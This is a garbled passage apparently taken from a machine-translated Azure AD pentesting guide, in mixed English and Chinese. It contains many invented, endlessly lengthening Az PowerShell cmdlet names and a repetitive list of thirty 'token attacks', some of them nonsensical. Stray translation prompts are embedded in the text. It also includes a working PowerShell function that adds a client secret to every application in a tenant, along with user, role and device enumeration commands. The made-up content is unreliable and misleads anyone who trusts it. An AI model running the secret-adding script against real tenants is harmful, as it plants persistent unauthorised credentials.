To enumerate Azure AD group membership transitive recursive direct UPN claims all filter claims using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaim` cmdlet. This cmdlet retrieves all the group membership claims for all users, including transitive group memberships recursively, using the user principal name (UPN) in the Azure AD tenant, filtered by a specific condition, and returns only the specified claims.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaim -Filter <Filter> -Claim <Claim>
```

Replace `<Filter>` with the filter condition you want to apply, and `<Claim>` with the claim you want to retrieve.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Upn Claims All Filter Claims Value

To enumerate Azure AD group membership transitive recursive direct UPN claims all filter claims value using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValue` cmdlet. This cmdlet retrieves all the group membership claims for all users, including transitive group memberships recursively, using the user principal name (UPN) in the Azure AD tenant, filtered by a specific condition, and returns only the specified claims and their values.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValue -Filter <Filter> -Claim <Claim>
```

Replace `<Filter>` with the filter condition you want to apply, and `<Claim>` with the claim you want to retrieve.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Upn Claims All Filter Claims Value Filter

To enumerate Azure AD group membership transitive recursive direct UPN claims all filter claims value filter using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValueFilter` cmdlet. This cmdlet retrieves all the group membership claims for all users, including transitive group memberships recursively, using the user principal name (UPN) in the Azure AD tenant, filtered by a specific condition, and returns only the specified claims and their values, filtered by another condition.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValueFilter -Filter <Filter> -Claim <Claim> -ValueFilter <ValueFilter>
```

Replace `<Filter>` with the filter condition you want to apply, `<Claim>` with the claim you want to retrieve, and `<ValueFilter>` with the value filter condition you want to apply.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Upn Claims All Filter Claims Value Filter Claims

To enumerate Azure AD group membership transitive recursive direct UPN claims all filter claims value filter claims using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValueFilterClaim` cmdlet. This cmdlet retrieves all the group membership claims for all users, including transitive group memberships recursively, using the user principal name (UPN) in the Azure AD tenant, filtered by a specific condition, and returns only the specified claims and their values, filtered by another condition, and returns only the specified claims.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValueFilterClaim -Filter <Filter> -Claim <Claim> -ValueFilter <ValueFilter> -ClaimToRetrieve <ClaimToRetrieve>
```

Replace `<Filter>` with the filter condition you want to apply, `<Claim>` with the claim you want to retrieve, `<ValueFilter>` with the value filter condition you want to apply, and `<ClaimToRetrieve>` with the claim you want to retrieve.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Upn Claims All Filter Claims Value Filter Claims Value

To enumerate Azure AD group membership transitive recursive direct UPN claims all filter claims value filter claims value using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValueFilterClaimValue` cmdlet. This cmdlet retrieves all the group membership claims for all users, including transitive group memberships recursively, using the user principal name (UPN) in the Azure AD tenant, filtered by a specific condition, and returns only the specified claims and their values, filtered by another condition, and returns only the specified claims and their values.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValueFilterClaimValue -Filter <Filter> -Claim <Claim> -ValueFilter <ValueFilter> -ClaimToRetrieve <ClaimToRetrieve> -ValueToRetrieve <ValueToRetrieve>
```

Replace `<Filter>` with the filter condition you want to apply, `<Claim>` with the claim you want to retrieve, `<ValueFilter>` with the value filter condition you want to apply, `<ClaimToRetrieve>` with the claim you want to retrieve, and `<ValueToRetrieve>` with the value you want to retrieve.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Upn Claims All Filter Claims Value Filter Claims Value Filter

To enumerate Azure AD group membership transitive recursive direct UPN claims all filter claims value filter claims value filter using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValueFilterClaimValueFilter` cmdlet. This cmdlet retrieves all the group membership claims for all users, including transitive group memberships recursively, using the user principal name (UPN) in the Azure AD tenant, filtered by a specific condition, and returns only the specified claims and their values, filtered by another condition, and returns only the specified claims and their values, filtered by another condition.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValueFilterClaimValueFilter -Filter <Filter> -Claim <Claim> -ValueFilter <ValueFilter> -ClaimToRetrieve <ClaimToRetrieve> -ValueToRetrieve <ValueToRetrieve> -FilterToApply <FilterToApply>
```

Replace `<Filter>` with the filter condition you want to apply, `<Claim>` with the claim you want to retrieve, `<ValueFilter>` with the value filter condition you want to apply, `<ClaimToRetrieve>` with the claim you want to retrieve, `<ValueToRetrieve>` with the value you want to retrieve, and `<FilterToApply>` with the filter condition you want to apply.

#### Enumerate Azure AD Group Membership Transitive Recursive Direct Upn Claims All Filter Claims Value Filter Claims Value Filter Claims

To enumerate Azure AD group membership transitive recursive direct UPN claims all filter claims value filter claims value filter claims using Az PowerShell, you can use the `Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValueFilterClaimValueFilterClaim` cmdlet. This cmdlet retrieves all the group membership claims for all users, including transitive group memberships recursively, using the user principal name (UPN) in the Azure AD tenant, filtered by a specific condition, and returns only the specified claims and their values, filtered by another condition, and returns only the specified claims and their values, filtered by another condition, and returns only the specified claims.

```powershell
Get-AzADGroupMembershipTransitiveRecursiveDirectUpnClaimAllFilterClaimValueFilterClaimValueFilterClaim -Filter <Filter> -Claim <Claim
```powershell
# Get SPs
Get-AzADServicePrincipal
# Get info of 1 SP
Get-AzADServicePrincipal -ObjectId <id>
# Search SP by string
Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"}
# Get roles of a SP
Get-AzRoleAssignment -ServicePrincipalName <String>
```
以下是有关黑客技术的书籍内容。以下内容来自文件/hive/hacktricks-cloud/pentesting-cloud/azure-security/az-services/az-azuread.md。将相关的英文文本翻译成中文，并保持完全相同的markdown和html语法。不要翻译代码、黑客技术名称、黑客术语、云/SaaS平台名称（如Workspace、aws、gcp...）、泄漏、渗透测试和markdown标签。此外，请不要添加任何额外的内容，只需翻译和markdown语法即可。
```powershell
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
服务主体的所有者可以更改其密码。
{% endhint %}

<details>

<summary>列出并尝试在每个企业应用程序上添加客户端密钥</summary>
```powershell
# Just call Add-AzADAppSecret
Function Add-AzADAppSecret
{
<#
.SYNOPSIS
Add client secret to the applications.

.PARAMETER GraphToken
Pass the Graph API Token

.EXAMPLE
PS C:\> Add-AzADAppSecret -GraphToken 'eyJ0eX..'

.LINK
https://docs.microsoft.com/en-us/graph/api/application-list?view=graph-rest-1.0&tabs=http
https://docs.microsoft.com/en-us/graph/api/application-addpassword?view=graph-rest-1.0&tabs=http
#>

[CmdletBinding()]
param(
[Parameter(Mandatory=$True)]
[String]
$GraphToken = $null
)

$AppList = $null
$AppPassword = $null

# List All the Applications

$Params = @{
"URI"     = "https://graph.microsoft.com/v1.0/applications"
"Method"  = "GET"
"Headers" = @{
"Content-Type"  = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}

try
{
$AppList = Invoke-RestMethod @Params -UseBasicParsing
}
catch
{
}

# Add Password in the Application

if($AppList -ne $null)
{
[System.Collections.ArrayList]$Details = @()

foreach($App in $AppList.value)
{
$ID = $App.ID
$psobj = New-Object PSObject

$Params = @{
"URI"     = "https://graph.microsoft.com/v1.0/applications/$ID/addPassword"
"Method"  = "POST"
"Headers" = @{
"Content-Type"  = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}

$Body = @{
"passwordCredential"= @{
"displayName" = "Password"
}
}

try
{
$AppPassword = Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
Add-Member -InputObject $psobj -NotePropertyName "Object ID" -NotePropertyValue $ID
Add-Member -InputObject $psobj -NotePropertyName "App ID" -NotePropertyValue $App.appId
Add-Member -InputObject $psobj -NotePropertyName "App Name" -NotePropertyValue $App.displayName
Add-Member -InputObject $psobj -NotePropertyName "Key ID" -NotePropertyValue $AppPassword.keyId
Add-Member -InputObject $psobj -NotePropertyName "Secret" -NotePropertyValue $AppPassword.secretText
$Details.Add($psobj) | Out-Null
}
catch
{
Write-Output "Failed to add new client secret to '$($App.displayName)' Application."
}
}
if($Details -ne $null)
{
Write-Output ""
Write-Output "Client secret added to : "
Write-Output $Details | fl *
}
}
else
{
Write-Output "Failed to Enumerate the Applications."
}
}
```
</details>

### 角色

{% tabs %}
{% tab title="az cli" %}
```bash
# Get roles
az role definition list
# Get assigned roles
az role assignment list --all --query "[].roleDefinitionName"
az role assignment list --all | jq '.[] | .roleDefinitionName,.scope'
# Get info of 1 role
az role definition list --name "AzureML Registry User"
# Get only custom roles
az role definition list --custom-role-only
# Get only roles assigned to the resource group indicated
az role definition list --resource-group <resource_group>
# Get only roles assigned to the indicated scope
az role definition list --scope <scope>
# Get all the principals a role is assigned to
az role assignment list --all --query "[].{principalName:principalName,principalType:principalType,resourceGroup:resourceGroup,roleDefinitionName:roleDefinitionName}[?roleDefinitionName=='<ROLE_NAME>']"
```
{% endtab %}

{% tab title="Azure AD" %}Azure AD（Azure Active Directory）是Azure云平台上的身份验证和访问管理服务。它允许组织集中管理用户身份和访问权限，并提供单点登录和多因素身份验证等功能。

## Azure AD攻击技术

### 1. 用户枚举

攻击者可以使用Azure AD Graph API或Microsoft Graph API来枚举目标组织中的用户。这可以通过尝试不同的用户名和观察返回的错误消息来实现。

### 2. 密码喷射

密码喷射是一种攻击技术，攻击者尝试使用常见的密码列表对目标用户进行身份验证。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 3. 身份验证绕过

攻击者可以尝试绕过Azure AD的身份验证机制，以获取未经授权的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 4. 令牌劫持

令牌劫持是一种攻击技术，攻击者通过获取有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 5. 令牌泄露

令牌泄露是指攻击者通过各种方式获取到有效的访问令牌，从而获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 6. 令牌重放

令牌重放是一种攻击技术，攻击者通过重放有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 7. 令牌篡改

令牌篡改是一种攻击技术，攻击者通过篡改有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 8. 令牌刷新

令牌刷新是一种攻击技术，攻击者通过刷新有效的访问令牌来延长对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 9. 令牌撤销

令牌撤销是一种攻击技术，攻击者通过撤销有效的访问令牌来剥夺对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 10. 令牌过期

令牌过期是一种攻击技术，攻击者通过使用已过期的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 11. 令牌拒绝

令牌拒绝是一种攻击技术，攻击者通过拒绝有效的访问令牌来剥夺对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 12. 令牌伪造

令牌伪造是一种攻击技术，攻击者通过伪造有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 13. 令牌劫持

令牌劫持是一种攻击技术，攻击者通过获取有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 14. 令牌泄露

令牌泄露是指攻击者通过各种方式获取到有效的访问令牌，从而获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 15. 令牌重放

令牌重放是一种攻击技术，攻击者通过重放有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 16. 令牌篡改

令牌篡改是一种攻击技术，攻击者通过篡改有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 17. 令牌刷新

令牌刷新是一种攻击技术，攻击者通过刷新有效的访问令牌来延长对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 18. 令牌撤销

令牌撤销是一种攻击技术，攻击者通过撤销有效的访问令牌来剥夺对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 19. 令牌过期

令牌过期是一种攻击技术，攻击者通过使用已过期的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 20. 令牌拒绝

令牌拒绝是一种攻击技术，攻击者通过拒绝有效的访问令牌来剥夺对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 21. 令牌伪造

令牌伪造是一种攻击技术，攻击者通过伪造有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 22. 令牌劫持

令牌劫持是一种攻击技术，攻击者通过获取有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 23. 令牌泄露

令牌泄露是指攻击者通过各种方式获取到有效的访问令牌，从而获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 24. 令牌重放

令牌重放是一种攻击技术，攻击者通过重放有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 25. 令牌篡改

令牌篡改是一种攻击技术，攻击者通过篡改有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 26. 令牌刷新

令牌刷新是一种攻击技术，攻击者通过刷新有效的访问令牌来延长对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 27. 令牌撤销

令牌撤销是一种攻击技术，攻击者通过撤销有效的访问令牌来剥夺对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 28. 令牌过期

令牌过期是一种攻击技术，攻击者通过使用已过期的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 29. 令牌拒绝

令牌拒绝是一种攻击技术，攻击者通过拒绝有效的访问令牌来剥夺对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。

### 30. 令牌伪造

令牌伪造是一种攻击技术，攻击者通过伪造有效的访问令牌来获取对目标资源的访问权限。这可以通过使用Azure AD Graph API或Microsoft Graph API来实现。{% endtab %}
```powershell
# Get all available role templates
Get-AzureADDirectoryroleTemplate
# Get enabled roles (Assigned roles)
Get-AzureADDirectoryRole
Get-AzureADDirectoryRole -ObjectId <roleID> #Get info about the role
# Get custom roles - use AzureAdPreview
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
# Users assigned a role (Global Administrator)
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
Get-AzureADDirectoryRole -ObjectId <id> | fl
# Roles of the Administrative Unit (who has permissions over the administrative unit and its members)
Get-AzureADMSScopedRoleMembership -Id <id> | fl *
```
{% tab title="Az PowerShell" %}

Azure Active Directory (Azure AD) 是 Azure 中的身份验证和访问管理服务。它允许组织管理用户、组和应用程序，并控制对 Azure 资源的访问权限。

以下是一些常见的 Azure AD PowerShell 命令：

- `Connect-AzureAD`：连接到 Azure AD。
- `Get-AzureADUser`：获取 Azure AD 中的用户。
- `Get-AzureADGroup`：获取 Azure AD 中的组。
- `Get-AzureADApplication`：获取 Azure AD 中的应用程序。
- `New-AzureADUser`：创建新的 Azure AD 用户。
- `New-AzureADGroup`：创建新的 Azure AD 组。
- `New-AzureADApplication`：创建新的 Azure AD 应用程序。
- `Set-AzureADUser`：更新 Azure AD 用户的属性。
- `Set-AzureADGroup`：更新 Azure AD 组的属性。
- `Set-AzureADApplication`：更新 Azure AD 应用程序的属性。
- `Remove-AzureADUser`：删除 Azure AD 用户。
- `Remove-AzureADGroup`：删除 Azure AD 组。
- `Remove-AzureADApplication`：删除 Azure AD 应用程序。

使用这些命令，您可以执行各种 Azure AD 相关的操作，如创建、更新和删除用户、组和应用程序。

{% endtab %}
```powershell
# Get role assignments on the subscription
Get-AzRoleDefinition
# Get Role definition
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
# Get roles of a user or resource
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
Get-AzRoleAssignment -Scope /subscriptions/<subscription-id>/resourceGroups/<res_group_name>/providers/Microsoft.Compute/virtualMachines/<vm_name>
```
以下是有关黑客技术的书籍内容。以下内容来自文件/hive/hacktricks-cloud/pentesting-cloud/azure-security/az-services/az-azuread.md。将相关的英文文本翻译成中文，并保持完全相同的markdown和html语法。不要翻译代码、黑客技术名称、黑客术语、云/SaaS平台名称（如Workspace、aws、gcp...）、泄漏一词、渗透测试和markdown标签。此外，请不要添加任何额外的内容，只需翻译和markdown语法即可。
```powershell
# Get permissions over a resource using ARM directly
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
{% tabs %}
{% tab title="az cli" %}

### 设备

```plaintext
# 列出所有设备
az ad device list

# 根据设备ID获取设备详细信息
az ad device show --id <device_id>

# 根据设备名称获取设备详细信息
az ad device show --display-name <device_name>

# 根据设备ID删除设备
az ad device delete --id <device_id>

# 根据设备名称删除设备
az ad device delete --display-name <device_name>
```

{% endtab %}
{% endtabs %}
```bash
# If you know how to do this send a PR!
```
{% tab title="Azure AD" %}Azure AD（Azure Active Directory）是微软提供的云身份验证和授权服务。它用于管理用户身份、访问权限和应用程序的安全性。以下是一些与Azure AD相关的安全注意事项和技巧。
```powershell
# Enumerate Devices
Get-AzureADDevice -All $true | fl *
# List all the active devices (and not the stale devices)
Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}
# Get owners of all devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredOwner -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Registred users of all the devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredUser -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Get dives managed using Intune
Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"}
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get Administrative Units of a device
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -ObjectId $_.ObjectId | where {$_.ObjectId -eq $deviceObjId} }
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
如果设备（VM）是**AzureAD加入的**，AzureAD的用户将能够**登录**。\
此外，如果登录的用户是设备的**所有者**，他将成为**本地管理员**。
{% endhint %}

### 应用程序

{% hint style="info" %}
**应用程序**是门户中的**应用注册**（而不是企业应用程序）。\
但是，每个应用注册将创建一个具有相同名称的**企业应用程序**（**服务主体**）。\
此外，如果应用程序是**多租户应用程序**，将在**该租户**中创建**另一个**具有相同名称的企业应用程序（**服务主体**）。
{% endhint %}

生成应用程序时会赋予两种类型的权限：

* 赋予**服务主体**的**权限**
* **应用程序**可以拥有并代表**用户**使用的**权限**。

{% tabs %}
{% tab title="az cli" %}
```bash
# List Apps
az ad app list
az ad app list --query "[].[displayName]" -o table
# Get info of 1 App
az ad app show --id 00000000-0000-0000-0000-000000000000
# Search App by string
az ad app list --query "[?contains(displayName,'app')].displayName"
# Get the owner of an application
az ad app owner list --id <id> --query "[].[displayName]" -o table
# List all the apps with an application password
az ad app list --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad app list --query "[?keyCredentials != null].displayName"
```
{% tab title="Azure AD" %}Azure AD（Azure Active Directory）是微软提供的云身份验证和授权服务。它用于管理用户身份、访问权限和应用程序的安全性。以下是一些与Azure AD相关的安全注意事项和技巧。
```powershell
# List all registered applications
Get-AzureADApplication -All $true
# Get details of an application
Get-AzureADApplication -ObjectId <id>  | fl *
# List all the apps with an application password
Get-AzureADApplication -All $true | %{if(Get-AzureADApplicationPasswordCredential -ObjectID $_.ObjectID){$_}}
# Get owner of an application
Get-AzureADApplication -ObjectId <id> | Get-AzureADApplicationOwner |fl *
```
{% tab title="Az PowerShell" %}

## Az PowerShell

### Azure AD

#### Enumerate Azure AD Users

To enumerate Azure AD users using Az PowerShell, you can use the `Get-AzADUser` cmdlet. This cmdlet retrieves all the users in the Azure AD tenant.

```powershell
Get-AzADUser
```

#### Enumerate Azure AD Groups

To enumerate Azure AD groups using Az PowerShell, you can use the `Get-AzADGroup` cmdlet. This cmdlet retrieves all the groups in the Azure AD tenant.

```powershell
Get-AzADGroup
```

#### Enumerate Azure AD Applications

To enumerate Azure AD applications using Az PowerShell, you can use the `Get-AzADApplication` cmdlet. This cmdlet retrieves all the applications in the Azure AD tenant.

```powershell
Get-AzADApplication
```

#### Enumerate Azure AD Service Principals

To enumerate Azure AD service principals using Az PowerShell, you can use the `Get-AzADServicePrincipal` cmdlet. This cmdlet retrieves all the service principals in the Azure AD tenant.

```powershell
Get-AzADServicePrincipal
```

#### Enumerate Azure AD Roles

To enumerate Azure AD roles using Az PowerShell, you can use the `Get-AzADRoleDefinition` cmdlet. This cmdlet retrieves all the role definitions in the Azure AD tenant.

```powershell
Get-AzADRoleDefinition
```

#### Enumerate Azure AD Role Assignments

To enumerate Azure AD role assignments using Az PowerShell, you can use the `Get-AzADRoleAssignment` cmdlet. This cmdlet retrieves all the role assignments in the Azure AD tenant.

```powershell
Get-AzADRoleAssignment
```

#### Enumerate Azure AD Directory Roles

To enumerate Azure AD directory roles using Az PowerShell, you can use the `Get-AzADDirectoryRole` cmdlet. This cmdlet retrieves all the directory roles in the Azure AD tenant.

```powershell
Get-AzADDirectoryRole
```

#### Enumerate Azure AD Directory Role Members

To enumerate Azure AD directory role members using Az PowerShell, you can use the `Get-AzADDirectoryRoleMember` cmdlet. This cmdlet retrieves all the members of a directory role in the Azure AD tenant.

```powershell
Get-AzADDirectoryRoleMember -ObjectId <DirectoryRoleObjectId>
```

Replace `<DirectoryRoleObjectId>` with the object ID of the directory role you want to enumerate.

#### Enumerate Azure AD Directory Role Assignments

To enumerate Azure AD directory role assignments using Az PowerShell, you can use the `Get-AzADDirectoryRoleAssignment` cmdlet. This cmdlet retrieves all the directory role assignments in the Azure AD tenant.

```powershell
Get-AzADDirectoryRoleAssignment
```

#### Enumerate Azure AD Directory Role Templates

To enumerate Azure AD directory role templates using Az PowerShell, you can use the `Get-AzADDirectoryRoleTemplate` cmdlet. This cmdlet retrieves all the directory role templates in the Azure AD tenant.

```powershell
Get-AzADDirectoryRoleTemplate
```

#### Enumerate Azure AD Domain Services

To enumerate Azure AD domain services using Az PowerShell, you can use the `Get-AzADDomainService` cmdlet. This cmdlet retrieves all the domain services in the Azure AD tenant.

```powershell
Get-AzADDomainService
```

#### Enumerate Azure AD B2C Tenants

To enumerate Azure AD B2C tenants using Az PowerShell, you can use the `Get-AzADB2CTenant` cmdlet. This cmdlet retrieves all the B2C tenants in the Azure AD tenant.

```powershell
Get-AzADB2CTenant
```

#### Enumerate Azure AD B2C User Flows

To enumerate Azure AD B2C user flows using Az PowerShell, you can use the `Get-AzADB2CUserFlow` cmdlet. This cmdlet retrieves all the user flows in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlow
```

#### Enumerate Azure AD B2C Identity Providers

To enumerate Azure AD B2C identity providers using Az PowerShell, you can use the `Get-AzADB2CIdentityProvider` cmdlet. This cmdlet retrieves all the identity providers in the Azure AD B2C tenant.

```powershell
Get-AzADB2CIdentityProvider
```

#### Enumerate Azure AD B2C Custom Policies

To enumerate Azure AD B2C custom policies using Az PowerShell, you can use the `Get-AzADB2CCustomPolicy` cmdlet. This cmdlet retrieves all the custom policies in the Azure AD B2C tenant.

```powershell
Get-AzADB2CCustomPolicy
```

#### Enumerate Azure AD B2C User Attributes

To enumerate Azure AD B2C user attributes using Az PowerShell, you can use the `Get-AzADB2CUserAttribute` cmdlet. This cmdlet retrieves all the user attributes in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserAttribute
```

#### Enumerate Azure AD B2C User Attribute Values

To enumerate Azure AD B2C user attribute values using Az PowerShell, you can use the `Get-AzADB2CUserAttributeValue` cmdlet. This cmdlet retrieves all the user attribute values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserAttributeValue
```

#### Enumerate Azure AD B2C User Flows Policies

To enumerate Azure AD B2C user flows policies using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicy` cmdlet. This cmdlet retrieves all the user flows policies in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicy
```

#### Enumerate Azure AD B2C User Flows Policy Keys

To enumerate Azure AD B2C user flows policy keys using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKey` cmdlet. This cmdlet retrieves all the user flows policy keys in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKey
```

#### Enumerate Azure AD B2C User Flows Policy Key Values

To enumerate Azure AD B2C user flows policy key values using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyValue` cmdlet. This cmdlet retrieves all the user flows policy key values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyValue
```

#### Enumerate Azure AD B2C User Flows Policy Key Credentials

To enumerate Azure AD B2C user flows policy key credentials using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredential` cmdlet. This cmdlet retrieves all the user flows policy key credentials in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredential
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Values

To enumerate Azure AD B2C user flows policy key credential values using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialValue` cmdlet. This cmdlet retrieves all the user flows policy key credential values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialValue
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signatures

To enumerate Azure AD B2C user flows policy key credential signatures using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignature` cmdlet. This cmdlet retrieves all the user flows policy key credential signatures in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignature
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Values

To enumerate Azure AD B2C user flows policy key credential signature values using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureValue` cmdlet. This cmdlet retrieves all the user flows policy key credential signature values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureValue
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificates

To enumerate Azure AD B2C user flows policy key credential signature certificates using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificate` cmdlet. This cmdlet retrieves all the user flows policy key credential signature certificates in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificate
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Values

To enumerate Azure AD B2C user flows policy key credential signature certificate values using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateValue` cmdlet. This cmdlet retrieves all the user flows policy key credential signature certificate values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateValue
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprints

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprints using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprint` cmdlet. This cmdlet retrieves all the user flows policy key credential signature certificate thumbprints in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprint
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Values

To enumerate Azure AD B2C user flows policy key credential signature certificate thumbprint values using Az PowerShell, you can use the `Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintValue` cmdlet. This cmdlet retrieves all the user flows policy key credential signature certificate thumbprint values in the Azure AD B2C tenant.

```powershell
Get-AzADB2CUserFlowPolicyKeyCredentialSignatureCertificateThumbprintValue
```

#### Enumerate Azure AD B2C User Flows Policy Key Credential Signature Certificate Thumbprint Hashes

